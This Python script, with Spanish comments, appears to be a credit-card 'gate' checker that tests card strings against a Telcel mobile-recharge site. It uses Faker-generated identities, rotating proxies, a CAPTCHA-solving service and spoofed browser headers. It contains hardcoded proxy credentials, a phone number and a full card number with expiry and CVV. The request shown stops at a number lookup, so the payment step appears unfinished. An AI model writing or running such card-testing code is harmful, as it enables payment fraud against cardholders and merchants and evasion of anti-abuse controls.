import ast
import email
from email import message
from tarfile import data_filter
import random, time
import token
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            #c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            
           
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'text/plain;charset=UTF-8',
                'Origin': 'https://mitelcel1.recarga.telcel.com',
                'Pragma': 'no-cache',
                'Referer': 'https://mitelcel1.recarga.telcel.com/MiTelcelMXExternalWebAnonymous/enter.do?Action=1&Amount=15&ProductCode=ILIM30&ProductDescription=Internet%20por%20tiempo%2030&TelcelChannelID=11&TelcelChannelName=TCL&UserPlan=undefined&Region=undefined&Profile=undefined&Recomendado=no',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'Solo si es requerido y limpio, por ejemplo: JSESSIONID=XXXXXX;',
            }

            data = (
                "callCount=1\n"
                "page=/MiTelcelMXExternalWebAnonymous/enter.do?Action=1&Amount=15&ProductCode=ILIM30&ProductDescription=Internet%20por%20tiempo%2030&TelcelChannelID=11&TelcelChannelName=TCL&UserPlan=undefined&Region=undefined&Profile=undefined&Recomendado=no\n"
                "httpSessionId=\n"
                "scriptSessionId=190550306A982BE6D05A52C656DF570D444\n"
                "c0-scriptName=Services\n"
                "c0-methodName=anonymousRechargeMdnQuery\n"
                "c0-id=0\n"
                "c0-param0=string:9831172324\n"
                "batchId=0\n"
            )

            # Hacer la petición
            session = requests.Session()
            response = session.post(
                'https://mitelcel1.recarga.telcel.com/MiTelcelMXExternalWebAnonymous/dwr/call/plaincall/Services.anonymousRechargeMdnQuery.dwr',
                headers=headers,
                data=data,
            )

            # Mostrar resultado
            print(response.text)

            




            

            
                                    
            


            
            print("Status Code:", response.status_code)
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("4027665833248538|05|2027|781"))